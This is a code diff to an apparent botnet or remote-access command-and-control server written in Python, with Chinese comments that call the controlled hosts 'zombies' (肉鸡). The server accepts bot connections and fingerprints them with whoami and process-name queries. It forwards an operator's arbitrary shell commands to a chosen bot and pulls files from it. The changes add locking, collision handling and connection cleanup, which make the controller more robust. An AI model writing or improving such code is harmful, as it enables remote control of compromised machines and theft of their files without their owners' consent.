@@ -38,6 +38,9 @@ def aes_encrypt(plaintext: bytes, key: bytes) -> str:
 _send_locks = {}
 _send_locks_guard = threading.Lock()
 
+# P1-10: 保护共享的 Client_roujis 字典（C 监听线程写入，A 处理线程读写 / 删除时 pop）
+_roujis_lock = threading.Lock()
+
 def _get_send_lock(sock):
     with _send_locks_guard:
         lock = _send_locks.get(sock)
@@ -406,13 +409,9 @@ def server_C_listen(server_C):
             client_c, address = server_C.accept()
             print(f"[*] 接收到了客户端C的连接：来自{address[0]}的{address[1]}端口")
 
-            # 保存连接信息
-            # 发送一个whoami命令，获取用户名
             process_name = "unknown"
+            handshake_ok = False
             try:
-                # 设置非阻塞模式和超时
-                # client_c.setblocking(False)
-
                 # 设置超时，避免永久阻塞
                 client_c.settimeout(10.0)
 
@@ -420,7 +419,7 @@ def server_C_listen(server_C):
                 client_c.send("whoami".encode("UTF-8"))
                 response = data_Byte_chardet(recv_result(client_c))
                 if not response:
-                    continue
+                    raise socket.error("whoami 响应为空，拒绝该连接")
                 user = response.strip()
 
                 # 获取进程名称（兼容Windows和Linux）
@@ -433,25 +432,33 @@ def server_C_listen(server_C):
                     else:
                         client_c.send("ps -p $ -o comm=".encode("UTF-8"))
                     process_name = data_Byte_chardet(recv_result(client_c)).strip()
-                    # print(f"获取到的进程名称: {process_name}")
                     process_name = "unknown" if not process_name else process_name
-
                 else:
                     print("获取进程名称超时，使用默认值")
 
                 # 恢复阻塞模式
                 client_c.setblocking(True)
 
-                add_rouji(rouji_ID,address[0],address[1],user,process_name)
-                Client_roujis[rouji_ID] = client_c
+                # P1-11: 同一秒内多个 C 端连接可能碰撞到同一 rouji_ID，碰撞则递增；
+                # P1-10: 碰撞检查 + 写入在锁内原子完成，避免竞态
+                with _roujis_lock:
+                    while rouji_ID in Client_roujis:
+                        rouji_ID += 1
+                    Client_roujis[rouji_ID] = client_c
+                add_rouji(rouji_ID, address[0], address[1], user, process_name)
+                handshake_ok = True
 
             except socket.timeout:
-                print("获取用户名或进程名称超时，使用默认值")
-                client_c.setblocking(True)
+                print("获取用户名或进程名称超时，丢弃该连接")
+            except socket.error as e:
+                print(f"握手阶段连接错误，丢弃该连接: {e}")
             except Exception as e:
                 print(f"获取用户信息失败: {e}")
+
+            # P1-11: 握手未完成（空响应/超时/异常）时关闭 socket，避免连接泄漏
+            if not handshake_ok:
                 try:
-                    client_c.setblocking(True)
+                    client_c.close()
                 except:
                     pass
         except socket.error as e:
@@ -507,6 +514,13 @@ def handle_client_a(client, address):
                         rouji_commands = decoded_data.split(" #> ")
                         rouji_id = int(rouji_commands[0])
 
+                        # P1-10: 安全取用该肉鸡 socket（肉鸡可能已被其他线程删除 / 断开）
+                        with _roujis_lock:
+                            target = Client_roujis.get(rouji_id)
+                        if target is None:
+                            send_result(client, f"肉鸡 {rouji_id} 不存在或已断开，请刷新".encode("UTF-8"))
+                            continue
+
                         # 忙守卫（P0-5）：该肉鸡正在文件传输时，拒绝同肉鸡的其他命令，
                         # 避免普通命令的 recv_result 把文件字节流当成下一帧长度前缀，
                         # 导致 C 端协议流永久失步。仅放行 "get stop"（用于停止当前传输）。
@@ -518,9 +532,14 @@ def handle_client_a(client, address):
 
                         # 判断是不是exit的rouji退出命令
                         if "exit" == rouji_commands[1]:
+                            with _roujis_lock:
+                                Client_roujis.pop(rouji_id, None)
                             delete_rouji(rouji_id)
-                            Client_roujis[rouji_id].send("exit".encode("UTF-8"))
-                            Client_roujis[rouji_id].close()
+                            try:
+                                target.send("exit".encode("UTF-8"))
+                                target.close()
+                            except Exception:
+                                pass
                         elif "get" in rouji_commands[1] and rouji_commands[1].startswith("get "):
                             # 停止传输命令：置 in_transfer=False，让后台接收线程尽快结束
                             if rouji_commands[1].strip() == "get stop":
@@ -538,16 +557,16 @@ def handle_client_a(client, address):
                                     remote_file = parts[1]
 
                                     # 转发get命令给肉鸡C
-                                    Client_roujis[rouji_id].send(rouji_commands[1].encode("UTF-8"))
+                                    target.send(rouji_commands[1].encode("UTF-8"))
 
                                     # 接收文件大小（使用select避免长时间阻塞）
-                                    readable, _, _ = select.select([Client_roujis[rouji_id]], [], [], 5.0)
+                                    readable, _, _ = select.select([target], [], [], 5.0)
                                     if not readable:
                                         # client.send("接收文件大小超时".encode("UTF-8"))
                                         send_result(client, "接收文件大小超时".encode("UTF-8"))
                                         continue
 
-                                    file_size_data = Client_roujis[rouji_id].recv(1024).decode("UTF-8")
+                                    file_size_data = target.recv(1024).decode("UTF-8")
                                     file_size = int(file_size_data)
 
                                     # client.send(f"开始文件传输，文件大小: {file_size} 字节".encode("UTF-8"))
@@ -571,11 +590,11 @@ def handle_client_a(client, address):
                         else:
                             try:
                                 # 发送普通命令给肉鸡C
-                                Client_roujis[rouji_id].send(rouji_commands[1].encode("UTF-8"))
+                                target.send(rouji_commands[1].encode("UTF-8"))
 
                                 # 使用select等待响应，避免长时间阻塞
                                 # data = Client_roujis[rouji_id].recv(3072)
-                                data = recv_result(Client_roujis[rouji_id])
+                                data = recv_result(target)
                                 send_result(client, data)   # 发送的是字节流，接收需要解码为字符串
                                 # client.send(data)
                             except Exception as e:
@@ -583,6 +602,9 @@ def handle_client_a(client, address):
 
                     except Exception as e:
                         print(f"命令处理错误: {e}")
+            except BlockingIOError:
+                # P1-9: 非阻塞 A 端 recv 返回 EAGAIN（暂无数据）不等于断连，跳过本轮重试
+                continue
             except socket.error as e:
                 print(f"A端连接错误: {e}")
                 break
